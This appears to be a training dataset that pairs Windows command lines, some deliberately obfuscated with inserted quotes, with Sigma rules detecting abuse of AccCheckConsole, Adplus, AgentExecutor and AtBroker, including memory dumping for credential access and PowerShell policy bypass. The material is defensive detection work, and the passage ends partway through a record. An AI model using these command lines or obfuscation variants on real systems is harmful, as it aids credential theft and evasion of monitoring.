{"instruction": "Write Sigma rule to detect payload:", "input": "\\AccCheckConsole.exe AccCheckConsole.exe -hwnd -process -window", "output": "title: Potential DLL Injection Via AccCheckConsole\nid: 0f6da907-5854-4be6-859a-e9958747b0aa\nstatus: test\ndescription: |\n    Detects the execution \"AccCheckConsole\" a command-line tool for verifying the accessibility implementation of an application's UI.\n    One of the tests that this checker can run are called \"verification routine\", which tests for things like Consistency, Navigation, etc.\n    The tool allows a user to provide a DLL that can contain a custom \"verification routine\". An attacker can build such DLLs and pass it via the CLI, which would then be loaded in the context of the \"AccCheckConsole\" utility.\nreferences:\n    - https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340\n    - https://twitter.com/bohops/status/1477717351017680899?s=12\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/AccCheckConsole/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-06\nmodified: 2024-08-29\ntags:\n    - attack.execution\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AccCheckConsole.exe'\n        - OriginalFileName: 'AccCheckConsole.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -hwnd'\n            - ' -process '\n            - ' -window '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the UI Accessibility Checker\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AccCheckConsole.exe AccCheckConsole.exe -hwnd -process \\\"-\\\"\\\"w\\\"\\\"i\\\"\\\"n\\\"\\\"d\\\"\\\"o\\\"\\\"w\\\"", "output": "title: Potential DLL Injection Via AccCheckConsole\nid: 0f6da907-5854-4be6-859a-e9958747b0aa\nstatus: test\ndescription: |\n    Detects the execution \"AccCheckConsole\" a command-line tool for verifying the accessibility implementation of an application's UI.\n    One of the tests that this checker can run are called \"verification routine\", which tests for things like Consistency, Navigation, etc.\n    The tool allows a user to provide a DLL that can contain a custom \"verification routine\". An attacker can build such DLLs and pass it via the CLI, which would then be loaded in the context of the \"AccCheckConsole\" utility.\nreferences:\n    - https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340\n    - https://twitter.com/bohops/status/1477717351017680899?s=12\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/AccCheckConsole/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-06\nmodified: 2024-08-29\ntags:\n    - attack.execution\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AccCheckConsole.exe'\n        - OriginalFileName: 'AccCheckConsole.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -hwnd'\n            - ' -process '\n            - ' -window '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the UI Accessibility Checker\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AccCheckConsole AccCheckConsole -hwnd -process -window", "output": "title: Potential DLL Injection Via AccCheckConsole\nid: 0f6da907-5854-4be6-859a-e9958747b0aa\nstatus: test\ndescription: |\n    Detects the execution \"AccCheckConsole\" a command-line tool for verifying the accessibility implementation of an application's UI.\n    One of the tests that this checker can run are called \"verification routine\", which tests for things like Consistency, Navigation, etc.\n    The tool allows a user to provide a DLL that can contain a custom \"verification routine\". An attacker can build such DLLs and pass it via the CLI, which would then be loaded in the context of the \"AccCheckConsole\" utility.\nreferences:\n    - https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340\n    - https://twitter.com/bohops/status/1477717351017680899?s=12\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/AccCheckConsole/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-06\nmodified: 2024-08-29\ntags:\n    - attack.execution\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AccCheckConsole.exe'\n        - OriginalFileName: 'AccCheckConsole.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -hwnd'\n            - ' -process '\n            - ' -window '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the UI Accessibility Checker\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AccCheckConsole.exe -window AccCheckConsole.exe -process -hwnd", "output": "title: Potential DLL Injection Via AccCheckConsole\nid: 0f6da907-5854-4be6-859a-e9958747b0aa\nstatus: test\ndescription: |\n    Detects the execution \"AccCheckConsole\" a command-line tool for verifying the accessibility implementation of an application's UI.\n    One of the tests that this checker can run are called \"verification routine\", which tests for things like Consistency, Navigation, etc.\n    The tool allows a user to provide a DLL that can contain a custom \"verification routine\". An attacker can build such DLLs and pass it via the CLI, which would then be loaded in the context of the \"AccCheckConsole\" utility.\nreferences:\n    - https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340\n    - https://twitter.com/bohops/status/1477717351017680899?s=12\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/AccCheckConsole/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-06\nmodified: 2024-08-29\ntags:\n    - attack.execution\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AccCheckConsole.exe'\n        - OriginalFileName: 'AccCheckConsole.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -hwnd'\n            - ' -process '\n            - ' -window '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the UI Accessibility Checker\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\adplus.exe Adplus.exe -hang -pn -pmn -p -po -c -sc", "output": "title: Potential Adplus.EXE Abuse\nid: 2f869d59-7f6a-4931-992c-cce556ff2d53\nstatus: test\ndescription: Detects execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/\n    - https://twitter.com/nas_bench/status/1534916659676422152\n    - https://twitter.com/nas_bench/status/1534915321856917506\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\nmodified: 2023-06-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\adplus.exe'\n        - OriginalFileName: 'Adplus.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Dump process memory\n            - ' -hang '\n            - ' -pn '\n            - ' -pmn '\n            - ' -p '\n            - ' -po '\n            # Using a config file\n            - ' -c '\n            # Execute commands inline\n            - ' -sc '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of Adplus for debugging purposes\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\adplus.exe Adplus.exe \\\"-h\\\"ang -pn -pmn -p -po -c -sc", "output": "title: Potential Adplus.EXE Abuse\nid: 2f869d59-7f6a-4931-992c-cce556ff2d53\nstatus: test\ndescription: Detects execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/\n    - https://twitter.com/nas_bench/status/1534916659676422152\n    - https://twitter.com/nas_bench/status/1534915321856917506\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\nmodified: 2023-06-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\adplus.exe'\n        - OriginalFileName: 'Adplus.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Dump process memory\n            - ' -hang '\n            - ' -pn '\n            - ' -pmn '\n            - ' -p '\n            - ' -po '\n            # Using a config file\n            - ' -c '\n            # Execute commands inline\n            - ' -sc '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of Adplus for debugging purposes\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\adplus Adplus -hang -pn -pmn -p -po -c -sc", "output": "title: Potential Adplus.EXE Abuse\nid: 2f869d59-7f6a-4931-992c-cce556ff2d53\nstatus: test\ndescription: Detects execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/\n    - https://twitter.com/nas_bench/status/1534916659676422152\n    - https://twitter.com/nas_bench/status/1534915321856917506\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\nmodified: 2023-06-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\adplus.exe'\n        - OriginalFileName: 'Adplus.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Dump process memory\n            - ' -hang '\n            - ' -pn '\n            - ' -pmn '\n            - ' -p '\n            - ' -po '\n            # Using a config file\n            - ' -c '\n            # Execute commands inline\n            - ' -sc '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of Adplus for debugging purposes\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\adplus.exe Adplus.exe -hang -pn -pmn -p -po -c -sc", "output": "title: Potential Adplus.EXE Abuse\nid: 2f869d59-7f6a-4931-992c-cce556ff2d53\nstatus: test\ndescription: Detects execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/\n    - https://twitter.com/nas_bench/status/1534916659676422152\n    - https://twitter.com/nas_bench/status/1534915321856917506\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-09\nmodified: 2023-06-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\adplus.exe'\n        - OriginalFileName: 'Adplus.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Dump process memory\n            - ' -hang '\n            - ' -pn '\n            - ' -pmn '\n            - ' -p '\n            - ' -po '\n            # Using a config file\n            - ' -c '\n            # Execute commands inline\n            - ' -sc '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of Adplus for debugging purposes\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AgentExecutor.exe -powershell -remediationScript \\Microsoft.Management.Services.IntuneWindowsAgent.exe", "output": "title: AgentExecutor PowerShell Execution\nid: 7efd2c8d-8b18-45b7-947d-adfe9ed04f61\nrelated:\n    - id: c0b40568-b1e9-4b03-8d6c-b096da6da9ab\n      type: similar\nstatus: test\ndescription: Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument\nauthor: Nasreddine Bencherchali (Nextron Systems), memory-shards\nreferences:\n    - https://twitter.com/lefterispan/status/1286259016436514816\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/\n    - https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\n    - https://twitter.com/jseerden/status/1247985304667066373/photo/1\ndate: 2022-12-24\nmodified: 2024-08-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image: '\\AgentExecutor.exe'\n        - OriginalFileName: 'AgentExecutor.exe'\n    selection_cli:\n        # Example:\n        #   AgentExecutor.exe -powershell [scriptPath] [outputFilePath] [errorFilePath] [timeoutFilePath] [timeoutSeconds] [powershellPath] [enforceSignatureCheck] [runAs32BitOn64]\n        # Note:\n        #   - If [timeoutSeconds] is NULL then it defaults to 60000\n        #   - If [enforceSignatureCheck] is:\n        #       - \"NULL\" or \"1\" then a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy allsigned -file \"\n        #       - Else a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy bypass -file \"\n        #   - [powershellPath] is always concatendated to \"powershell.exe\"\n        CommandLine|contains:\n            - ' -powershell' # Also covers the \"-powershellDetection\" flag\n            - ' -remediationScript'\n    filter_main_intune:\n        ParentImage|endswith: '\\Microsoft.Management.Services.IntuneWindowsAgent.exe'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate use via Intune management. You exclude script paths and names to reduce FP rate\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AgentExecutor.exe -powershell -remediationScript \\\"M\"\"i\"\"c\"\"r\"\"o\"\"s\"\"o\"\"f\"\"t\"\".\"\"M\"\"a\"\"n\"\"a\"\"g\"\"e\"\"m\"\"e\"\"n\"\"t\"\".\"\"S\"\"e\"\"r\"\"v\"\"i\"\"c\"\"e\"\"s\"\".\"\"I\"\"n\"\"t\"\"u\"\"n\"\"e\"\"W\"\"i\"\"n\"\"d\"\"o\"\"w\"\"s\"\"A\"\"g\"\"e\"\"n\"\"t\"\".\"\"e\"\"x\"\"e\"", "output": "title: AgentExecutor PowerShell Execution\nid: 7efd2c8d-8b18-45b7-947d-adfe9ed04f61\nrelated:\n    - id: c0b40568-b1e9-4b03-8d6c-b096da6da9ab\n      type: similar\nstatus: test\ndescription: Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument\nauthor: Nasreddine Bencherchali (Nextron Systems), memory-shards\nreferences:\n    - https://twitter.com/lefterispan/status/1286259016436514816\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/\n    - https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\n    - https://twitter.com/jseerden/status/1247985304667066373/photo/1\ndate: 2022-12-24\nmodified: 2024-08-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image: '\\AgentExecutor.exe'\n        - OriginalFileName: 'AgentExecutor.exe'\n    selection_cli:\n        # Example:\n        #   AgentExecutor.exe -powershell [scriptPath] [outputFilePath] [errorFilePath] [timeoutFilePath] [timeoutSeconds] [powershellPath] [enforceSignatureCheck] [runAs32BitOn64]\n        # Note:\n        #   - If [timeoutSeconds] is NULL then it defaults to 60000\n        #   - If [enforceSignatureCheck] is:\n        #       - \"NULL\" or \"1\" then a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy allsigned -file \"\n        #       - Else a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy bypass -file \"\n        #   - [powershellPath] is always concatendated to \"powershell.exe\"\n        CommandLine|contains:\n            - ' -powershell' # Also covers the \"-powershellDetection\" flag\n            - ' -remediationScript'\n    filter_main_intune:\n        ParentImage|endswith: '\\Microsoft.Management.Services.IntuneWindowsAgent.exe'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate use via Intune management. You exclude script paths and names to reduce FP rate\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AgentExecutor -powershell -remediationScript \\Microsoft.Management.Services.IntuneWindowsAgent", "output": "title: AgentExecutor PowerShell Execution\nid: 7efd2c8d-8b18-45b7-947d-adfe9ed04f61\nrelated:\n    - id: c0b40568-b1e9-4b03-8d6c-b096da6da9ab\n      type: similar\nstatus: test\ndescription: Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument\nauthor: Nasreddine Bencherchali (Nextron Systems), memory-shards\nreferences:\n    - https://twitter.com/lefterispan/status/1286259016436514816\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/\n    - https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\n    - https://twitter.com/jseerden/status/1247985304667066373/photo/1\ndate: 2022-12-24\nmodified: 2024-08-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image: '\\AgentExecutor.exe'\n        - OriginalFileName: 'AgentExecutor.exe'\n    selection_cli:\n        # Example:\n        #   AgentExecutor.exe -powershell [scriptPath] [outputFilePath] [errorFilePath] [timeoutFilePath] [timeoutSeconds] [powershellPath] [enforceSignatureCheck] [runAs32BitOn64]\n        # Note:\n        #   - If [timeoutSeconds] is NULL then it defaults to 60000\n        #   - If [enforceSignatureCheck] is:\n        #       - \"NULL\" or \"1\" then a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy allsigned -file \"\n        #       - Else a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy bypass -file \"\n        #   - [powershellPath] is always concatendated to \"powershell.exe\"\n        CommandLine|contains:\n            - ' -powershell' # Also covers the \"-powershellDetection\" flag\n            - ' -remediationScript'\n    filter_main_intune:\n        ParentImage|endswith: '\\Microsoft.Management.Services.IntuneWindowsAgent.exe'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate use via Intune management. You exclude script paths and names to reduce FP rate\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AgentExecutor.exe -powershell -remediationScript \\Microsoft.Management.Services.IntuneWindowsAgent.exe", "output": "title: AgentExecutor PowerShell Execution\nid: 7efd2c8d-8b18-45b7-947d-adfe9ed04f61\nrelated:\n    - id: c0b40568-b1e9-4b03-8d6c-b096da6da9ab\n      type: similar\nstatus: test\ndescription: Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument\nauthor: Nasreddine Bencherchali (Nextron Systems), memory-shards\nreferences:\n    - https://twitter.com/lefterispan/status/1286259016436514816\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/\n    - https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension\n    - https://twitter.com/jseerden/status/1247985304667066373/photo/1\ndate: 2022-12-24\nmodified: 2024-08-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image: '\\AgentExecutor.exe'\n        - OriginalFileName: 'AgentExecutor.exe'\n    selection_cli:\n        # Example:\n        #   AgentExecutor.exe -powershell [scriptPath] [outputFilePath] [errorFilePath] [timeoutFilePath] [timeoutSeconds] [powershellPath] [enforceSignatureCheck] [runAs32BitOn64]\n        # Note:\n        #   - If [timeoutSeconds] is NULL then it defaults to 60000\n        #   - If [enforceSignatureCheck] is:\n        #       - \"NULL\" or \"1\" then a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy allsigned -file \"\n        #       - Else a PowerShell instance is spawned with the args: \"-NoProfile -executionPolicy bypass -file \"\n        #   - [powershellPath] is always concatendated to \"powershell.exe\"\n        CommandLine|contains:\n            - ' -powershell' # Also covers the \"-powershellDetection\" flag\n            - ' -remediationScript'\n    filter_main_intune:\n        ParentImage|endswith: '\\Microsoft.Management.Services.IntuneWindowsAgent.exe'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate use via Intune management. You exclude script paths and names to reduce FP rate\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AtBroker.exe AtBroker.exe start animations audiodescription caretbrowsing caretwidth colorfiltering cursorindicator cursorscheme filterkeys focusborderheight focusborderwidth highcontrast keyboardcues keyboardpref livecaptions magnifierpane messageduration minimumhitradius mousekeys Narrator osk overlappedcontent showsounds soundsentry speechreco stickykeys togglekeys voiceaccess windowarranging windowtracking windowtrackingtimeout windowtrackingzorder Oracle_JavaAccessBridge", "output": "title: Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE\nid: f24bcaea-0cd1-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".\nreferences:\n    - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n    - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/\nauthor: Mateusz Wydra, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AtBroker.exe'\n        - OriginalFileName: 'AtBroker.exe'\n    selection_cli:\n        CommandLine|contains: 'start'\n    filter_main_builtin:\n        CommandLine|contains:\n            - 'animations'\n            - 'audiodescription'\n            - 'caretbrowsing'\n            - 'caretwidth'\n            - 'colorfiltering'\n            - 'cursorindicator'\n            - 'cursorscheme'\n            - 'filterkeys'\n            - 'focusborderheight'\n            - 'focusborderwidth'\n            - 'highcontrast'\n            - 'keyboardcues'\n            - 'keyboardpref'\n            - 'livecaptions'\n            - 'magnifierpane'\n            - 'messageduration'\n            - 'minimumhitradius'\n            - 'mousekeys'\n            - 'Narrator'\n            - 'osk'\n            - 'overlappedcontent'\n            - 'showsounds'\n            - 'soundsentry'\n            - 'speechreco'\n            - 'stickykeys'\n            - 'togglekeys'\n            - 'voiceaccess'\n            - 'windowarranging'\n            - 'windowtracking'\n            - 'windowtrackingtimeout'\n            - 'windowtrackingzorder'\n    filter_optional_java:\n        CommandLine|contains: 'Oracle_JavaAccessBridge'\n    condition: all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate, non-default assistive technology applications execution\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AtBroker.exe AtBroker.exe start animations audiodescription caretbrowsing caretwidth colorfiltering cursorindicator cursorscheme filte\"rkeys\" focusborderheight focusborderwidth highcontrast keyboardcues keyboardpref livecaptions magnifierpane messageduration minimumhitradius mousekeys Narrator osk overlappedcontent showsounds soundsentry speechreco stickykeys togglekeys voiceaccess windowarranging windowtracking windowtrackingtimeout windowtrackingzorder Oracle_JavaAccessBridge", "output": "title: Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE\nid: f24bcaea-0cd1-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".\nreferences:\n    - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n    - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/\nauthor: Mateusz Wydra, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AtBroker.exe'\n        - OriginalFileName: 'AtBroker.exe'\n    selection_cli:\n        CommandLine|contains: 'start'\n    filter_main_builtin:\n        CommandLine|contains:\n            - 'animations'\n            - 'audiodescription'\n            - 'caretbrowsing'\n            - 'caretwidth'\n            - 'colorfiltering'\n            - 'cursorindicator'\n            - 'cursorscheme'\n            - 'filterkeys'\n            - 'focusborderheight'\n            - 'focusborderwidth'\n            - 'highcontrast'\n            - 'keyboardcues'\n            - 'keyboardpref'\n            - 'livecaptions'\n            - 'magnifierpane'\n            - 'messageduration'\n            - 'minimumhitradius'\n            - 'mousekeys'\n            - 'Narrator'\n            - 'osk'\n            - 'overlappedcontent'\n            - 'showsounds'\n            - 'soundsentry'\n            - 'speechreco'\n            - 'stickykeys'\n            - 'togglekeys'\n            - 'voiceaccess'\n            - 'windowarranging'\n            - 'windowtracking'\n            - 'windowtrackingtimeout'\n            - 'windowtrackingzorder'\n    filter_optional_java:\n        CommandLine|contains: 'Oracle_JavaAccessBridge'\n    condition: all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate, non-default assistive technology applications execution\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AtBroker.exe AtBroker.exe start animations audiodescription caretbrowsing caretwidth colorfiltering cursorindicator cursorscheme filterkeys focusborderheight focusborderwidth highcontrast keyboardcues keyboardpref livecaptions magnifierpane messageduration minimumhitradius mousekeys Narrator osk overlappedcontent showsounds soundsentry speechreco stickykeys togglekeys voiceaccess windowarranging windowtracking windowtrackingtimeout windowtrackingzorder Oracle_JavaAccessBridge", "output": "title: Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE\nid: f24bcaea-0cd1-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".\nreferences:\n    - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n    - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/\nauthor: Mateusz Wydra, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AtBroker.exe'\n        - OriginalFileName: 'AtBroker.exe'\n    selection_cli:\n        CommandLine|contains: 'start'\n    filter_main_builtin:\n        CommandLine|contains:\n            - 'animations'\n            - 'audiodescription'\n            - 'caretbrowsing'\n            - 'caretwidth'\n            - 'colorfiltering'\n            - 'cursorindicator'\n            - 'cursorscheme'\n            - 'filterkeys'\n            - 'focusborderheight'\n            - 'focusborderwidth'\n            - 'highcontrast'\n            - 'keyboardcues'\n            - 'keyboardpref'\n            - 'livecaptions'\n            - 'magnifierpane'\n            - 'messageduration'\n            - 'minimumhitradius'\n            - 'mousekeys'\n            - 'Narrator'\n            - 'osk'\n            - 'overlappedcontent'\n            - 'showsounds'\n            - 'soundsentry'\n            - 'speechreco'\n            - 'stickykeys'\n            - 'togglekeys'\n            - 'voiceaccess'\n            - 'windowarranging'\n            - 'windowtracking'\n            - 'windowtrackingtimeout'\n            - 'windowtrackingzorder'\n    filter_optional_java:\n        CommandLine|contains: 'Oracle_JavaAccessBridge'\n    condition: all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate, non-default assistive technology applications execution\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AtBroker AtBroker start animations audiodescription caretbrowsing caretwidth colorfiltering cursorindicator cursorscheme filterkeys focusborderheight focusborderwidth highcontrast keyboardcues keyboardpref livecaptions magnifierpane messageduration minimumhitradius mousekeys Narrator osk overlappedcontent showsounds soundsentry speechreco stickykeys togglekeys voiceaccess windowarranging windowtracking windowtrackingtimeout windowtrackingzorder Oracle_JavaAccessBridge", "output": "title: Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE\nid: f24bcaea-0cd1-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".\nreferences:\n    - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n    - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/\nauthor: Mateusz Wydra, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AtBroker.exe'\n        - OriginalFileName: 'AtBroker.exe'\n    selection_cli:\n        CommandLine|contains: 'start'\n    filter_main_builtin:\n        CommandLine|contains:\n            - 'animations'\n            - 'audiodescription'\n            - 'caretbrowsing'\n            - 'caretwidth'\n            - 'colorfiltering'\n            - 'cursorindicator'\n            - 'cursorscheme'\n            - 'filterkeys'\n            - 'focusborderheight'\n            - 'focusborderwidth'\n            - 'highcontrast'\n            - 'keyboardcues'\n            - 'keyboardpref'\n            - 'livecaptions'\n            - 'magnifierpane'\n            - 'messageduration'\n            - 'minimumhitradius'\n            - 'mousekeys'\n            - 'Narrator'\n            - 'osk'\n            - 'overlappedcontent'\n            - 'showsounds'\n            - 'soundsentry'\n            - 'speechreco'\n            - 'stickykeys'\n            - 'togglekeys'\n            - 'voiceaccess'\n            - 'windowarranging'\n            - 'windowtracking'\n            - 'windowtrackingtimeout'\n            - 'windowtrackingzorder'\n    filter_optional_java:\n        CommandLine|contains: 'Oracle_JavaAccessBridge'\n    condition: all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate, non-default assistive technology applications execution\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AtBroker.exe AtBroker.exe start animations audiodescription caretbrowsing caretwidth colorfiltering cursorindicator cursorscheme filterkeys focusborderheight focusborderwidth highcontrast keyboardcues keyboardpref livecaptions magnifierpane messageduration minimumhitradius mousekeys Narrator osk overlappedcontent showsounds soundsentry speechreco stickykeys togglekeys voiceaccess windowarranging windowtracking windowtrackingtimeout windowtrackingzorder Oracle_JavaAccessBridge", "output": "title: Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE\nid: f24bcaea-0cd1-11eb-adc1-0242ac120002\nstatus: test\ndescription: Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".\nreferences:\n    - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n    - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/\nauthor: Mateusz Wydra, oscd.community\ndate: 2020-10-12\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\AtBroker.exe'\n        - OriginalFileName: 'AtBroker.exe'\n    selection_cli:\n        CommandLine|contains: 'start'\n    